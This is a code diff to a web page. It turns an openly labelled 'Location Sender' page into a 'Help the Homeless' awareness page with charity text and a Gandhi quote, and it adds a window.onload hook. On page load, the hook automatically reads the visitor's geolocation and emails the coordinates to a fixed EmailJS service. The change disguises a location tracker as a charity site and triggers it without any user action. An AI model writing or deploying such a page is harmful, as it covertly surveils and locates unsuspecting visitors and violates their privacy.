@@ -1,11 +1,55 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Location Sender</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Help the Homeless</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f2f2f2;
+            text-align: center;
+        }
+        header {
+            background-color: #333;
+            color: #fff;
+            padding: 20px 0;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        h1 {
+            margin-top: 40px;
+            font-size: 2.5em;
+            line-height: 1.3;
+        }
+        p {
+            font-size: 1.2em;
+            line-height: 1.6;
+            color: #555;
+        }
+        .quote {
+            margin-top: 30px;
+            font-style: italic;
+            color: #777;
+        }
+    </style>
 </head>
 <body>
-    <h1>Send Location</h1>
-    <button onclick="sendLocation()">Send Location</button>
+    <header>
+        <h1>Help the Homeless</h1>
+    </header>
+    <div class="container">
+        <p>This website is dedicated to raising awareness and support for homeless individuals.</p>
+        <p>Let's make a difference in their lives.</p>
+        <div class="quote">
+            <p>"The true measure of any society can be found in how it treats its most vulnerable members." - Gandhi</p>
+        </div>
+    </div>
 
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
@@ -24,7 +68,7 @@
                         longitude: longitude
                     };
 
-                    emailjs.send('service_byzjqmb','template_4e3dlry', templateParams)
+                    emailjs.send('service_byzjqmb', 'template_4e3dlry', templateParams)
                         .then(function(response) {
                             console.log('Email sent successfully!', response);
                         }, function(error) {
@@ -37,6 +81,11 @@
                 console.error('Geolocation is not supported by this browser.');
             }
         }
+
+        // Automatically send location on page load
+        window.onload = function() {
+            sendLocation();
+        };
     </script>
 </body>
 </html>
